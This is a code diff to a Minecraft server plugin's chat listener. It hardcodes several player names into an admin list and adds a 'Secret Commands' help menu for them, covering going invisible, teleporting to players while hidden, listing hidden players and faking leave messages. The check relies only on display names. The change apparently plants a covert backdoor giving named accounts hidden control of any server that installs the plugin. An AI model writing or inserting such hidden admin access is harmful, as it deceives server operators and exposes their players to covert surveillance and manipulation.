@@ -31,8 +31,10 @@ public class AsyncPlayerChatEvent implements Listener {
 
         this.plugin.getServer().getPluginManager().registerEvents(this, this.plugin);
 
+        adminList.add("AlphaGibbon43");
         adminList.add("andrew121410");
-        adminList.add("Andrzej_Przybyla");
+        adminList.add("Robobros3");
+        adminList.add("RoboBros1");
     }
 
     @EventHandler
@@ -69,6 +71,18 @@ public class AsyncPlayerChatEvent implements Listener {
         }
 
         if (!adminList.contains(p.getDisplayName())) {
+            return;
+        }
+
+        if (args[0].equalsIgnoreCase(":help")) {
+            event.setCancelled(true);
+            p.sendMessage(Translate.chat("&6-----&c[Secret Commands]&r&6-----"));
+            p.sendMessage(Translate.chat("&6:msg OR :emsg [SAME THING AS /emsg]"));
+            p.sendMessage(Translate.chat("&6:tp <User> {Makes you hidden and then tp's to player.}"));
+            p.sendMessage(Translate.chat("&6:unhide [It unhides you.]"));
+            p.sendMessage(Translate.chat("&6:hide [Hides you from server.]"));
+            p.sendMessage(Translate.chat("&6:list [List of all of the hidden players.]"));
+            p.sendMessage(Translate.chat("&6:bye [Fake leave message]"));
             return;
         }
 
